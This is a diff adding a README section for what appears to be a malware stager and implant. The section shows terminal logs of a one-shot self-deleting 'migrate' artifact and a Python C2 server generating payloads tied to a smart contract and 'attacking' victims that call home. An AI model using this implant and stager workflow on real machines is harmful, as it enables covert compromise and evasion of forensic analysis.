@@ -100,6 +100,33 @@ Use "help" to see the available commands!
 "92994c589f860bab7af687fc3525d3de445812f52e951f5cf2d04432751a1b8c" Called home!
 ```
 
+##### 6 - anddd, the artifact only runs once! (attempt to run the same artifact)
+```
+[Victim]
+
+user@Ubuntu:$ ./target/x86_64-unknown-linux-musl/release/migrate 
+user@Ubuntu:$ ./target/x86_64-unknown-linux-musl/release/migrate 
+-bash: ./target/x86_64-unknown-linux-musl/release/migrate: No such file or directory <- Unlink
+
+[Stager]
+user@Ubuntu:~/Desktop/babagola$ python3 server_rust.py 
+
+Server running!
+> gen_payload 127.0.0.1:1337 0x564c3D9bBF15D7Be75f7468b4470f5d0B11bbD79 wiDt52uxNO7X7iUB8v0THw== b100ca9f                                                                                                  
+Smart contract address :: 0x564c3D9bBF15D7Be75f7468b4470f5d0B11bbD79
+Smart contract Keccak :: b100ca9f
+Generated payload with hash :: b'67d6f46082e7ab5a48864d8e887bf571d1dca03161084392d1edf1738e03fdb6'
+
+[Valid Victim]
+> 127.0.0.1:46390 - ce0fba743a0694c32b5d3051c801c1518d0ecf719aa12e89da7ec3a133eb894f
+Records: b'Yo/W/UQkmZ8etNrjiHCJC7EIWP9It2V3r1AWDaPnqx4='
+
+New client incomming! preparing the missiles to attack :: ('127.0.0.1', 46390)
+Sending smart contract address :: 0x564c3D9bBF15D7Be75f7468b4470f5d0B11bbD79
+
+[Invalid Victim]
+127.0.0.1:38478 - ce0fba743a0694c32b5d3051c801c1518d0ecf719aa12e89da7ec3a133eb894f
+```
 
 ## Compilation
 ###### Static compile
